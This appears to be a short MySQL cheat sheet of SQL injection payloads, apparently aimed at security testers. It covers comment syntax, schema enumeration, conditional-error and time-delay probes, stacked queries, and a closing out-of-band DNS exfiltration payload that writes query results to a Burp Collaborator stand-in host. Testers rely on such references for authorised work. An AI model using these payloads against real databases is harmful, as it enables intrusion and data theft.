## summary

Useful SQL commands for mysql dbms

## string concatenation
`'foo' 'bar'` **note:** there is space exist between quotes


## substring
`SUBSTRING('foobar', 4, 2)`

## comments
`-- comments` **note:** there is space exist after dashes

`/*comments*/`

`#comments`

## database version
`select @@version`

## database contents
`select * from information_schema.tables`

`select * from information_schema.columns where table_name = 'TABLE-NAME-HERE'`

## conditional errors
`select if(YOUR-CONDITION-HERE,(select table_name from information_schema.tables),'a')`

## batched (or stacked) queries
`query-1-here; query-2-here`

## time delays
`select sleep(10)`

### samples

## conditional time delays
`select if(YOUR-CONDITION-HERE,sleep(10),'a')`

## dns lookup
The following techniques work on Windows only.

`load_file('\\\\YOUR-COLLABORATOR.burpcollaborator.net\\a') select ... into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a'`

## dns lookup with data exfiltration
The following technique works on Windows only. 

`select YOUR-QUERY-HERE into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a'` 

